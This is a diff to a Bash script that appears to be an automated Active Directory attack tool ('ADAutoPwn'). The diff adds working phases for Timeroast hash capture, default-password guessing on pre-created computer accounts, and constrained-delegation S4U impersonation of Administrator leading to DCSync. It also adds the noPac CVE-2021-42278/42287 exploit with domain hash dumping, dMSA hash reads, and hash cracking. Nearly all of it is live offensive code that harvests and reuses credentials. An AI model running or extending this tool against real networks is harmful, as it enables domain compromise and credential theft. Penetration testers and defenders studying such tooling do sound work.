@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.20.1"
+readonly VERSION="1.21.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -77,6 +77,21 @@ subsection() {
 }
 
 hr() { echo -e "${C_GREY}    ----------------------------------------------------------------${C_RESET}"; }
+
+ui_kv() {
+    local k="$1" v="$2"
+    detail "    ${C_GREY}│${C_RESET} ${C_BOLD}$(printf '%-16s' "$k")${C_RESET} ${C_GREY}│${C_RESET} $v"
+}
+
+ui_metric() {
+    local k="$1" v="$2" hint="${3:-}"
+    [[ -n "$hint" ]] && hint=" ${C_DIM}${hint}${C_RESET}"
+    detail "    ${C_GREY}│${C_RESET} ${C_CYAN}$(printf '%-22s' "$k")${C_RESET} ${C_GREY}│${C_RESET} ${C_BOLD}${v}${C_RESET}${hint}"
+}
+
+ui_panel_top()    { detail "    ${C_GREY}┌────────────────────────┬──────────────────────────────────────────────┐${C_RESET}"; }
+ui_panel_mid()    { detail "    ${C_GREY}├────────────────────────┼──────────────────────────────────────────────┤${C_RESET}"; }
+ui_panel_bottom() { detail "    ${C_GREY}└────────────────────────┴──────────────────────────────────────────────┘${C_RESET}"; }
 
 banner() {
     # Modern gradient palette (true-color). Falls back to empty strings w/ --no-color.
@@ -188,6 +203,8 @@ DOMAIN_WL=""                      # path to the generated domain-focused wordlis
 have() { command -v "$1" >/dev/null 2>&1; }
 NXC="$(command -v nxc || command -v netexec || true)"
 die() { err "$1"; exit 1; }
+script_dir() { cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd; }
+external_tool() { local p; p="$(script_dir)/external/$1"; [[ -e "$p" ]] && printf '%s\n' "$p"; }
 
 SUDO_PASS="${SUDO_PASS:-}"   # optional: enables fully unattended sudo (-S)
 
@@ -327,7 +344,7 @@ note_cred_source() { printf '%-28s  ⟵  %s\n' "$1" "$2" >>"$OUTDIR/valid_creds_
 check_deps() {
     section "DEPENDENCY CHECK"
     local req=(nmap smbclient rpcclient ldapsearch ntpdate)
-    local opt=(impacket-secretsdump impacket-GetUserSPNs impacket-GetNPUsers impacket-getTGT certipy bloodhound-python enum4linux-ng smbmap john hashcat)
+    local opt=(impacket-secretsdump impacket-GetUserSPNs impacket-GetNPUsers impacket-getTGT impacket-findDelegation certipy bloodhound-python enum4linux-ng smbmap john hashcat)
     local missing=0
 
     if [[ -z "$NXC" ]]; then err "netexec/nxc NOT found (required)"; missing=1; else ok "netexec/nxc -> $NXC"; fi
@@ -666,6 +683,38 @@ phase_asreproast() {
     fi
 }
 
+# ===========================================================================
+#  TIME ROASTING  (MS-SNTP machine-account hashes, no domain creds required)
+# ===========================================================================
+phase_timeroast() {
+    [[ "$STEALTH" == "1" ]] && { info "Stealth mode: skipping Timeroast"; return; }
+    [[ -z "$DOMAIN" ]] && { warn "No domain, skipping Timeroast"; return; }
+
+    section "TIME ROASTING · MS-SNTP machine-account hashes"
+    local outf="$OUTDIR/timeroast_hashes.txt"; : >"$outf"
+
+    # Opportunistic by design: recent NetExec builds include a timeroast module.
+    # If the module is missing or the DC does not answer MS-SNTP requests, this
+    # phase simply records no hashes and the engine keeps pivoting normally.
+    if [[ -n "$NXC" ]]; then
+        subsection "NetExec timeroast module"
+        run "$NXC smb $DC_IP -u '' -p '' -M timeroast"
+        $NXC smb "$DC_IP" -u '' -p '' -M timeroast 2>&1 | tee -a "$LOGFILE" \
+            | grep -E '(\$sntp-ms\$|\$krb5pa\$|\$krb5tgs\$|\$krb5asrep\$)' >>"$outf"
+    fi
+
+    if [[ -s "$outf" ]]; then
+        sort -u -o "$outf" "$outf"
+        loot "Timeroast hashes captured → timeroast_hashes.txt"
+        while read -r h; do echo -e "      ${C_MAGENTA}${h:0:80}…${C_RESET}"; done <"$outf"
+        ok "Saved to timeroast_hashes.txt (hashcat mode 31300 for \$sntp-ms\$)"
+        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 31300 "Timeroast"
+    else
+        info "No Timeroast hashes captured (module unavailable, patched target, or no MS-SNTP response)"
+        rm -f "$outf"
+    fi
+}
+
 # Expired / must-change password: with the known (old) plaintext we can set a
 # new one over kpasswd and use the account immediately — a real path, not a dead end.
 _change_expired_password() {
@@ -809,8 +858,10 @@ phase_auth_enum() {
             subsection "User descriptions (often leak passwords)"
             run "$NXC ldap $DCT ${args[*]} -M get-desc-users"
             $NXC ldap "$DCT" "${args[@]}" -M get-desc-users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/user_descriptions.txt"
-            grep -iE 'pass|pwd|cred' "$OUTDIR/user_descriptions.txt" 2>/dev/null \
-                && loot "Possible passwords in descriptions! review user_descriptions.txt"
+            if grep -qiE 'pass|pwd|cred|secret|token' "$OUTDIR/user_descriptions.txt" 2>/dev/null; then
+                loot "Possible passwords in descriptions → harvesting and feeding the pivot engine"
+                harvest_secrets "user_descriptions.txt" <"$OUTDIR/user_descriptions.txt"
+            fi
 
             subsection "Quick privilege-escalation indicators (LDAP modules)"
             for mod in maq adcs; do
@@ -873,6 +924,301 @@ phase_kerberoast() {
         [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 13100 "Kerberoast"
     else
         info "No Kerberoastable accounts found (no SPNs configured)"
+    fi
+}
+
+# ===========================================================================
+#  PRE-CREATED COMPUTER ACCOUNTS
+# ===========================================================================
+PRECREATED_DONE=0
+phase_precreated_computers() {
+    [[ "$HAVE_AUTH" != "1" ]] && return
+    [[ "$PRECREATED_DONE" == "1" ]] && return
+    [[ "$STEALTH" == "1" ]] && { info "Stealth mode: skipping pre-created computer account password checks"; return; }
+    [[ "$CAP_LDAP" != "1" || -z "$DOMAIN" ]] && return
+    have ldapsearch || return
+    have impacket-getTGT || { warn "impacket-getTGT unavailable → cannot validate pre-created computer passwords"; return; }
+    PRECREATED_DONE=1
+
+    section "PRE-CREATED COMPUTER ACCOUNTS · default-password pivot"
+    local base="dc=${DOMAIN//./,dc=}" raw="$OUTDIR/precreated_computers_ldap.txt" cand="$OUTDIR/precreated_computers.txt"
+    : >"$raw"; : >"$cand"
+
+    if [[ -n "$KERB_TICKET" ]]; then
+        run "ldapsearch -Y GSSAPI computers with pwdLastSet/lastLogonTimestamp"
+        KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" \
+            '(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
+            sAMAccountName pwdLastSet lastLogonTimestamp userAccountControl 2>/dev/null >"$raw"
+    elif [[ -n "$PASS" ]]; then
+        run "ldapsearch simple bind as $USER for computer account candidates"
+        ldapsearch -LLL -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" \
+            '(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
+            sAMAccountName pwdLastSet lastLogonTimestamp userAccountControl 2>/dev/null >"$raw"
+    else
+        info "Current credential is hash-only and no Kerberos LDAP bind is available → skipping"
+        rm -f "$raw" "$cand"
+        return
+    fi
+
+    awk '
+        BEGIN { RS=""; FS="\n" }
+        /sAMAccountName:/ {
+            sam=""; pwd=""; last=""; uac="";
+            for (i=1; i<=NF; i++) {
+                if ($i ~ /^sAMAccountName:/)      { sam=$i;  sub(/^sAMAccountName:[[:space:]]*/, "", sam) }
+                if ($i ~ /^pwdLastSet:/)          { pwd=$i;  sub(/^pwdLastSet:[[:space:]]*/, "", pwd) }
+                if ($i ~ /^lastLogonTimestamp:/)  { last=$i; sub(/^lastLogonTimestamp:[[:space:]]*/, "", last) }
+                if ($i ~ /^userAccountControl:/)  { uac=$i;  sub(/^userAccountControl:[[:space:]]*/, "", uac) }
+            }
+            if (sam != "" && (pwd == "0" || last == "" || last == "0"))
+                print sam "\t" pwd "\t" last "\t" uac
+        }
+    ' "$raw" | sort -u >"$cand"
+
+    if [[ ! -s "$cand" ]]; then
+        info "No clear pre-created computer candidates found"
+        return
+    fi
+
+    loot "$(wc -l <"$cand") computer account candidate(s) with unset password age/logon signals"
+    local sam stem pw got=0 tried=0 max=40
+    while IFS=$'\t' read -r sam _; do
+        [[ -z "$sam" || "$sam" != *\$ ]] && continue
+        (( tried++ ))
+        (( tried > max )) && { warn "Candidate cap reached ($max) to avoid excessive auth attempts"; break; }
+        stem="${sam%$}"
+        for pw in "$stem" "${stem,,}" "${stem^^}"; do
+            [[ -z "$pw" ]] && continue
+            run "impacket-getTGT ${DOMAIN}/${sam}:<candidate> -dc-ip $DC_IP"
+            rm -f "${sam}.ccache"
+            if impacket-getTGT "${DOMAIN}/${sam}:${pw}" -dc-ip "$DC_IP" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'Saving ticket|saved in'; then
+                rm -f "${sam}.ccache"
+                loot "★ Pre-created computer takeover: ${C_BOLD}${sam}${C_RESET} password is ${C_GREEN}${pw}${C_RESET}"
+                add_secret "$pw" "pre-created computer account ($sam)"
+                note_cred_source "$sam" "pre-created computer default password"
+                queue_cred "$sam" "$pw" "" "Pre-created computer account"
+                got=1
+                break
+            fi
+            rm -f "${sam}.ccache"
+        done
+    done <"$cand"
+
+    [[ "$got" == "0" ]] && info "No pre-created computer default passwords validated"
+}
+
+# ===========================================================================
+#  AD ATTACK SURFACE  (IATT/PATT modules that decide what to attack next)
+# ===========================================================================
+SURFACE_DONE=0
+phase_attack_surface() {
+    [[ "$HAVE_AUTH" != "1" ]] && return
+    [[ "$SURFACE_DONE" == "1" ]] && return
+    SURFACE_DONE=1
+    section "AD ATTACK SURFACE · delegation, deployment, DNS, RODC, dMSA"
+
+    local sf="$OUTDIR/ad_attack_surface.txt"; : >"$sf"
+    local args; mapfile -t args < <(nxc_cred_args)
+
+    if have impacket-findDelegation && [[ -n "$DOMAIN" ]]; then
+        subsection "Kerberos delegation (unconstrained / constrained / RBCD)"
+        if [[ -n "$KERB_TICKET" ]]; then
+            run "impacket-findDelegation $(imp_principal) -k -no-pass -dc-ip $DC_IP"
+            KRB5CCNAME="$KERB_TICKET" impacket-findDelegation "$(imp_principal)" -k -no-pass -dc-ip "$DC_IP" 2>&1 \
+                | tee -a "$LOGFILE" | tee -a "$sf"
+        elif [[ -n "$HASH" ]]; then
+            run "impacket-findDelegation $(imp_principal) -hashes :$HASH -dc-ip $DC_IP"
+            impacket-findDelegation "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" 2>&1 \
+                | tee -a "$LOGFILE" | tee -a "$sf"
+        elif [[ -n "$PASS" ]]; then
+            run "impacket-findDelegation $(imp_principal):*** -dc-ip $DC_IP"
+            impacket-findDelegation "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1 \
+                | tee -a "$LOGFILE" | tee -a "$sf"
+        fi
+        grep -qiE 'Unconstrained|Constrained|AllowedToDelegate|Protocol Transition|RBCD|msDS-AllowedToAct' "$sf" 2>/dev/null \
+            && loot "Delegation paths found → ad_attack_surface.txt (BloodHound/ACL phases will weaponize matching edges)"
+    fi
+
+    [[ "$CAP_LDAP" != "1" || -z "$DOMAIN" ]] && return
+    local base="dc=${DOMAIN//./,dc=}" ldapout="$OUTDIR/ad_attack_surface_ldap.txt"; : >"$ldapout"
+    _ldap_q() {
+        local filter="$1"; shift
+        if [[ -n "$KERB_TICKET" ]]; then
+            KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" "$filter" "$@" 2>/dev/null
+        elif [[ -n "$PASS" ]]; then
+            ldapsearch -LLL -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" "$filter" "$@" 2>/dev/null
+        fi
+    }
+
+    subsection "Deployment attack surface (SCCM / MDT / WSUS / SCOM / ADFS)"
+    {
+        echo "## SCCM / System Management"
+        _ldap_q '(|(objectClass=mSSMSManagementPoint)(objectClass=mSSMSSite)(cn=System Management)(servicePrincipalName=*MSServerClusterMgmtAPI*)(servicePrincipalName=*SMS*))' \
+            cn dNSHostName mSSMSMPName mSSMSSiteCode servicePrincipalName distinguishedName
+        echo
+        echo "## WSUS / MDT / SCOM / ADFS indicators"
+        _ldap_q '(|(servicePrincipalName=*WSUS*)(servicePrincipalName=*SCOM*)(servicePrincipalName=*ADFS*)(servicePrincipalName=*MSSQL*)(cn=*WSUS*)(cn=*MDT*)(cn=*SCOM*)(cn=*ADFS*))' \
+            cn dNSHostName servicePrincipalName distinguishedName
+    } | tee -a "$LOGFILE" >"$ldapout"
+    grep -qiE 'mSSMS|System Management|WSUS|MDT|SCOM|ADFS|MSSQL' "$ldapout" 2>/dev/null \
+        && loot "Deployment/management surface found → ad_attack_surface_ldap.txt"
+
+    subsection "RODC / DSRM / privileged group indicators"
+    {
+        echo "## RODC"
+        _ldap_q '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))' \
+            cn dNSHostName msDS-RevealedUsers msDS-NeverRevealGroup msDS-RevealOnDemandGroup
+        echo
+        echo "## DnsAdmins / DNS zones"
+        _ldap_q '(|(cn=DnsAdmins)(objectClass=dnsZone)(objectClass=dnsNode))' \
+            cn member distinguishedName dnsRecord
+        echo
+        echo "## dMSA / gMSA accounts"
+        _ldap_q '(|(objectClass=msDS-GroupManagedServiceAccount)(objectClass=msDS-DelegatedManagedServiceAccount))' \
+            sAMAccountName servicePrincipalName msDS-GroupMSAMembership msDS-ManagedAccountPrecededByLink distinguishedName
+    } | tee -a "$LOGFILE" >>"$ldapout"
+    grep -qiE 'msDS-DelegatedManagedServiceAccount|msDS-ManagedAccountPrecededByLink|DnsAdmins|dnsZone|msDS-RevealedUsers' "$ldapout" 2>/dev/null \
+        && loot "RODC/DNS/dMSA indicators found → ad_attack_surface_ldap.txt"
+}
+
+# Abuse constrained delegation when the current identity can S4U to a DC service.
+# This is non-destructive: it only requests a service ticket and immediately tries
+# DCSync with that ticket if the delegated SPN is useful (cifs/ldap/host on the DC).
+phase_delegation_abuse() {
+    [[ "$HAVE_AUTH" != "1" ]] && return
+    [[ "$DO_ABUSE" != "1" ]] && return
+    have impacket-getST || return
+    [[ -z "$DOMAIN" || ! -s "$OUTDIR/ad_attack_surface.txt" ]] && return
+
+    local user_lc="${USER,,}" dc_lc="${DC_FQDN,,}" spn=""
+    spn=$(awk -v u="$user_lc" -v dc="$dc_lc" '
+        BEGIN { IGNORECASE=1 }
+        index(tolower($0), u) && /(cifs|ldap|host)\// {
+            for (i=1; i<=NF; i++) {
+                if (tolower($i) ~ /^(cifs|ldap|host)\// && (dc == "" || index(tolower($i), dc) || index(tolower($i), "dc"))) {
+                    gsub(/[,;]/, "", $i); print $i; exit
+                }
+            }
+        }
+    ' "$OUTDIR/ad_attack_surface.txt")
+    [[ -z "$spn" ]] && return
+
+    section "CONSTRAINED DELEGATION ABUSE · S4U to Administrator"
+    loot "Current identity appears delegated to ${C_BOLD}$spn${C_RESET} → requesting Administrator service ticket"
+    local args=()
+    if [[ -n "$HASH" ]]; then args=(-hashes ":$HASH")
+    elif [[ -n "$PASS" ]]; then args=()
+    else info "No reusable password/hash for getST; skipping delegation abuse"; return; fi
+
+    local before after cc
+    before=$(find "$OUTDIR" -maxdepth 1 -name '*.ccache' -printf '%f\n' 2>/dev/null | sort)
+    if [[ -n "$HASH" ]]; then
+        run "impacket-getST -spn $spn -impersonate Administrator $(imp_principal) -hashes :$HASH -dc-ip $DC_IP"
+        ( cd "$OUTDIR" && impacket-getST -spn "$spn" -impersonate Administrator "$(imp_principal)" "${args[@]}" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    else
+        run "impacket-getST -spn $spn -impersonate Administrator $(imp_principal):*** -dc-ip $DC_IP"
+        ( cd "$OUTDIR" && impacket-getST -spn "$spn" -impersonate Administrator "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    fi
+    after=$(find "$OUTDIR" -maxdepth 1 -name '*.ccache' -printf '%f\n' 2>/dev/null | sort)
+    cc=$(comm -13 <(printf '%s\n' "$before") <(printf '%s\n' "$after") | head -1)
+    [[ -z "$cc" ]] && cc=$(find "$OUTDIR" -maxdepth 1 -iname '*Administrator*.ccache' -printf '%f\n' 2>/dev/null | head -1)
+    [[ -z "$cc" ]] && { warn "S4U ticket was not produced"; return; }
+
+    loot "★ Constrained delegation → Administrator ticket: ${C_BOLD}$cc${C_RESET}"
+    note_cred_source "Administrator@$spn" "constrained delegation S4U by $USER"
+    local old_ticket="$KERB_TICKET" old_user="$USER" old_pass="$PASS" old_hash="$HASH" old_auth="$HAVE_AUTH" old_admin="$IS_DC_ADMIN"
+    KERB_TICKET="$OUTDIR/$cc"; USER="Administrator"; PASS=""; HASH=""; HAVE_AUTH=1; IS_DC_ADMIN=1
+    export KRB5CCNAME="$KERB_TICKET"
+    phase_dcsync
+    USER="$old_user"; PASS="$old_pass"; HASH="$old_hash"; HAVE_AUTH="$old_auth"; IS_DC_ADMIN="$old_admin"; KERB_TICKET="$old_ticket"
+    [[ -n "$KERB_TICKET" ]] && export KRB5CCNAME="$KERB_TICKET" || unset KRB5CCNAME
+}
+
+# ===========================================================================
+#  CVE CHECKS  (safe checks first; exploit only when already implemented safely)
+# ===========================================================================
+CVE_DONE=0
+phase_cve_checks() {
+    local mode="unauth"; [[ "$HAVE_AUTH" == "1" ]] && mode="auth"
+    [[ "$CVE_DONE" == "auth" ]] && return
+    [[ "$mode" == "unauth" && "$CVE_DONE" == "unauth" ]] && return
+    [[ "$STEALTH" == "1" ]] && { info "Stealth mode: skipping CVE module checks"; return; }
+    CVE_DONE="$mode"
+    section "CVE CHECKS · AD-specific known-vuln modules ($mode)"
+
+    local args=()
+    if [[ "$HAVE_AUTH" == "1" ]]; then mapfile -t args < <(nxc_cred_args)
+    else args=(-u '' -p ''); fi
+
+    local out="$OUTDIR/cve_checks_${mode}.txt"; : >"$out"
+    local modules=(zerologon nopac printnightmare petitpotam dfscoerce spooler)
+    local m
+    for m in "${modules[@]}"; do
+        subsection "NetExec module: $m"
+        run "$NXC smb $DCT ${args[*]} -M $m"
+        $NXC smb "$DCT" "${args[@]}" -M "$m" 2>&1 | tee -a "$LOGFILE" | tee -a "$out"
+    done
+
+    if grep -qiE 'VULNERABLE|is vulnerable|Success|CVE-|NoPAC|Zerologon|PrintNightmare' "$out" 2>/dev/null; then
+        loot "Potential AD CVE/coercion finding(s) → $(basename "$out")"
+        if grep -qiE 'zerologon|CVE-2020-1472' "$out" 2>/dev/null; then
+            warn "Zerologon exploitation resets the DC machine password; ADAutoPwn only checks it automatically."
+        fi
+        if grep -qiE 'nopac|CVE-2021-42278|CVE-2021-42287' "$out" 2>/dev/null; then
+            warn "NoPAC likely needs a dedicated exploit chain; use --abuse only after confirming tool support and rollback plan."
+        fi
+    else
+        info "No positive CVE module result (or modules unavailable in this NetExec build)"
+        rm -f "$out"
+    fi
+}
+
+phase_nopac_abuse() {
+    [[ "$HAVE_AUTH" != "1" || "$DO_ABUSE" != "1" ]] && return
+    [[ -z "$DOMAIN" || -z "$USER" ]] && return
+    have python3 || return
+    local np; np="$(external_tool noPac/noPac.py)"
+    [[ -z "$np" ]] && return
+
+    section "NoPAC ABUSE · CVE-2021-42278/42287 to Administrator"
+    local principal="${DOMAIN}/${USER}" auth=() envp=()
+    if [[ -n "$PASS" ]]; then
+        principal="${principal}:${PASS}"
+    elif [[ -n "$HASH" ]]; then
+        auth=(-hashes ":$HASH")
+    elif [[ -n "$KERB_TICKET" ]]; then
+        auth=(-k -no-pass); envp=(env "KRB5CCNAME=$KERB_TICKET")
+    else
+        info "No reusable auth material for noPac; skipping"
+        return
+    fi
+
+    local common=(-dc-ip "$DC_IP")
+    [[ -n "$DC_HOST" ]] && common+=(-dc-host "$DC_HOST")
+
+    local scan="$OUTDIR/nopac_scan_$(_safe_name "$USER").txt"
+    local scanner; scanner="$(external_tool noPac/scanner.py)"
+    if [[ -n "$scanner" ]]; then
+        subsection "NoPAC scanner"
+        run "python3 scanner.py ${principal/:*/:***} ${common[*]} ${auth[*]}"
+        ( cd "$(dirname "$np")" && "${envp[@]}" python3 "$scanner" "$principal" "${common[@]}" "${auth[@]}" 2>&1 ) \
+            | tee -a "$LOGFILE" | tee "$scan"
+        if grep -qiE 'not vulnerable|patched|failed' "$scan" 2>/dev/null && ! grep -qiE 'vulnerable|CVE-2021-42278|CVE-2021-42287' "$scan" 2>/dev/null; then
+            info "NoPAC scanner did not report a vulnerable chain"
+            return
+        fi
+    fi
+
+    local out="$OUTDIR/nopac_abuse_$(_safe_name "$USER").txt"
+    subsection "NoPAC exploit + DCSync dump"
+    run "python3 noPac.py ${principal/:*/:***} ${common[*]} ${auth[*]} --impersonate administrator -dump -just-dc"
+    ( cd "$(dirname "$np")" && "${envp[@]}" python3 "$np" "$principal" "${common[@]}" "${auth[@]}" --impersonate administrator -dump -just-dc 2>&1 ) \
+        | tee -a "$LOGFILE" | tee "$out"
+
+    if grep -qE ':::' "$out" 2>/dev/null; then
+        ingest_dcsync_output "$out" "NoPAC CVE-2021-42278/42287"
+    else
+        warn "NoPAC did not produce DCSync hashes for $USER"
     fi
 }
 
@@ -1077,6 +1423,23 @@ phase_dcsync() {
     fi
 }
 
+ingest_dcsync_output() {
+    local src="$1" via="${2:-external exploit}"
+    [[ ! -s "$src" ]] && return 1
+    grep -E ':::' "$src" >>"$OUTDIR/secretsdump.txt" 2>/dev/null || return 1
+    sort -u -o "$OUTDIR/secretsdump.txt" "$OUTDIR/secretsdump.txt" 2>/dev/null
+    loot "★★★★★ DOMAIN HASHES INGESTED from ${via} ★★★★★"
+    local admin_hash
+    admin_hash=$(grep -iE '^(.*\\)?administrator:' "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1 | cut -d: -f4)
+    if [[ -n "$admin_hash" ]]; then
+        loot "ADMINISTRATOR HASH: $admin_hash"
+        note_cred_source "Administrator" "$via"
+        queue_cred "Administrator" "" "$admin_hash" "$via"
+    fi
+    grep -E ':::' "$OUTDIR/secretsdump.txt" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
+    return 0
+}
+
 # ===========================================================================
 #  SECRETS  —  LAPS + gMSA  (quick, high-value reads)
 # ===========================================================================
@@ -1118,6 +1481,19 @@ phase_secrets() {
             note_cred_source "$acc" "gMSA password read (NT hash)"
             queue_cred "$acc" "" "$h" "ReadGMSAPassword"; }
     done < <(echo "$gmsa" | grep -iE 'Account:.*NTLM:')
+
+    subsection "dMSA — delegated Managed Service Account hashes (opportunistic)"
+    run "$NXC ldap $DCT ${args[*]} -M dmsa"
+    local dmsa; dmsa=$($NXC ldap "$DCT" "${args[@]}" -M dmsa 2>&1); echo "$dmsa" | tee -a "$LOGFILE" | tee "$OUTDIR/dmsa.txt"
+    while IFS= read -r line; do
+        local acc h
+        acc=$(grep -oiP 'Account:\s*\K\S+'        <<<"$line" | head -1)
+        h=$(grep -oiP 'NTLM:\s*\K[a-fA-F0-9]{32}' <<<"$line" | head -1)
+        [[ -n "$acc" && -n "$h" ]] && {
+            loot "★ dMSA hash recovered for ${C_BOLD}$acc${C_RESET}: ${C_MAGENTA}$h${C_RESET}"
+            note_cred_source "$acc" "dMSA password read (NT hash)"
+            queue_cred "$acc" "" "$h" "ReadDMSAPassword"; }
+    done < <(echo "$dmsa" | grep -iE 'Account:.*NTLM:')
 }
 
 # ===========================================================================
@@ -2815,6 +3191,7 @@ crack_hashes() {
         case "$label" in
             AS-REP)     k=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@:]+' <<<"$line" | head -1) ;;
             Kerberoast) k=$(grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+'  <<<"$line" | head -1) ;;
+            Timeroast)  k=$(grep -oP '\$sntp-ms\$[^$]*\$\K[^$: ]+'     <<<"$line" | head -1) ;;
             *)          k="$line" ;;
         esac
         [[ -z "$k" ]] && k="$line"
@@ -2854,6 +3231,7 @@ crack_hashes() {
             case "$label" in
                 AS-REP)     user=$(echo "$line" | grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+') ;;
                 Kerberoast) user=$(echo "$line" | grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+') ;;
+                Timeroast)  user=$(echo "$line" | grep -oP '\$sntp-ms\$[^$]*\$\K[^$: ]+' | head -1) ;;
                 NTLM)       # map NT hash back to a username via the DCSync output
                     local nt="${line%%:*}"
                     user=$(grep -iE ":${nt}:::" "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1 | cut -d: -f1) ;;
@@ -3907,9 +4285,11 @@ finalize_loot() {
         pass_policy.txt enum4linux.json nmap_dc.txt domain_wordlist.txt shares_auth.txt \
         _userenum_seed.txt _asrep_seed.txt
 
-    _mv_loot secrets laps.txt gmsa.txt gpp.txt dpapi.txt winrm_users.txt share_secrets.txt \
+    _mv_loot secrets laps.txt gmsa.txt dmsa.txt gpp.txt dpapi.txt winrm_users.txt share_secrets.txt \
         coerce.txt relay_ldap.txt trusts.txt certipy_find.txt disabled_accounts.txt \
-        deleted_objects.txt disabled_or_locked.txt must_change_password.txt
+        deleted_objects.txt disabled_or_locked.txt must_change_password.txt \
+        precreated_computers.txt precreated_computers_ldap.txt nopac_scan_*.txt nopac_abuse_*.txt \
+        ad_attack_surface.txt ad_attack_surface_ldap.txt cve_checks_unauth.txt cve_checks_auth.txt
 
     local f
     for f in "$OUTDIR"/acl_writable_*.txt;          do [[ -e "$f" ]] && mv -f "$f" "$OUTDIR/secrets/" 2>/dev/null; done
@@ -3930,9 +4310,10 @@ gen_report() {
     # grep -c always prints a single number (0 when no match); capturing it
     # avoids the "0\n0" doubling you get from `&& grep || echo 0`.
     _grepc(){ local n; n=$(grep -cE "$1" "$2" 2>/dev/null); echo "${n:-0}"; }
-    local n_users n_asrep n_kerb n_ntlm n_crack
+    local n_users n_asrep n_time n_kerb n_ntlm n_crack
     n_users=$( [[ -s "$o/users_all.txt" ]] && wc -l <"$o/users_all.txt" || echo 0 )
     n_asrep=$(_grepc krb5asrep "$o/asrep_hashes.txt")
+    n_time=$( [[ -s "$o/timeroast_hashes.txt" ]] && wc -l <"$o/timeroast_hashes.txt" || echo 0 )
     n_kerb=$( _grepc krb5tgs   "$o/kerberoast_hashes.txt")
     n_ntlm=$( _grepc ':::'     "$o/secretsdump.txt")
     n_crack=$( [[ -s "$o/cracked_passwords.txt" ]] && wc -l <"$o/cracked_passwords.txt" || echo 0 )
@@ -3952,6 +4333,7 @@ gen_report() {
         echo "|---|---|"
         echo "| Users enumerated | $n_users |"
         echo "| AS-REP hashes | $n_asrep |"
+        echo "| Timeroast hashes | $n_time |"
         echo "| Kerberoast hashes | $n_kerb |"
         echo "| NTLM hashes (DCSync) | $n_ntlm |"
         echo "| Cracked passwords | $n_crack |"
@@ -4023,18 +4405,33 @@ _render_chain() {
 # ===========================================================================
 final_summary() {
     section "OPERATION SUMMARY"
-    echo -e "  ${C_BOLD}Target:${C_RESET}        $DC_IP  (${DC_FQDN:-?})"
-    echo -e "  ${C_BOLD}Domain:${C_RESET}        ${DOMAIN:-?}"
-    echo -e "  ${C_BOLD}Auth mode:${C_RESET}     $([[ $KERBEROS == 1 ]] && echo Kerberos || echo NTLM)"
-    echo -e "  ${C_BOLD}Authenticated:${C_RESET} $([[ $HAVE_AUTH == 1 ]] && echo "${C_GREEN}YES ($USER)${C_RESET}" || echo "${C_YELLOW}NO${C_RESET}")"
-    echo -e "  ${C_BOLD}Loot dir:${C_RESET}      $OUTDIR"
-    hr
-    [[ -s "$OUTDIR/users_all.txt" ]]         && loot "Enumerated users:    $(wc -l <"$OUTDIR/users_all.txt")"
-    [[ -s "$OUTDIR/asrep_hashes.txt" ]]      && loot "AS-REP hashes:       $(grep -c krb5asrep "$OUTDIR/asrep_hashes.txt")"
-    [[ -s "$OUTDIR/kerberoast_hashes.txt" ]] && loot "Kerberoast hashes:   $(grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt" 2>/dev/null)"
-    [[ -s "$OUTDIR/secretsdump.txt" ]]       && loot "NTLM hashes (DCSync):$(grep -cE ':::' "$OUTDIR/secretsdump.txt")"
-    [[ -s "$OUTDIR/cracked_passwords.txt" ]] && loot "Cracked passwords:   $(wc -l <"$OUTDIR/cracked_passwords.txt")"
-    grep -qiE 'ESC[0-9]+' "$OUTDIR/certipy_find.txt" 2>/dev/null && loot "Vulnerable ADCS:     YES (see certipy_find.txt)"
+    local auth_state users_n asrep_n time_n kerb_n ntlm_n cracked_n adcs_state admin_state
+    auth_state=$([[ $HAVE_AUTH == 1 ]] && echo "${C_GREEN}YES${C_RESET} ${C_DIM}($USER)${C_RESET}" || echo "${C_YELLOW}NO${C_RESET}")
+    users_n=$( [[ -s "$OUTDIR/users_all.txt" ]] && wc -l <"$OUTDIR/users_all.txt" || echo 0 )
+    asrep_n=$( [[ -s "$OUTDIR/asrep_hashes.txt" ]] && grep -c krb5asrep "$OUTDIR/asrep_hashes.txt" || echo 0 )
+    time_n=$( [[ -s "$OUTDIR/timeroast_hashes.txt" ]] && wc -l <"$OUTDIR/timeroast_hashes.txt" || echo 0 )
+    kerb_n=$( [[ -s "$OUTDIR/kerberoast_hashes.txt" ]] && grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt" 2>/dev/null || echo 0 )
+    ntlm_n=$( [[ -s "$OUTDIR/secretsdump.txt" ]] && grep -cE ':::' "$OUTDIR/secretsdump.txt" || echo 0 )
+    cracked_n=$( [[ -s "$OUTDIR/cracked_passwords.txt" ]] && wc -l <"$OUTDIR/cracked_passwords.txt" || echo 0 )
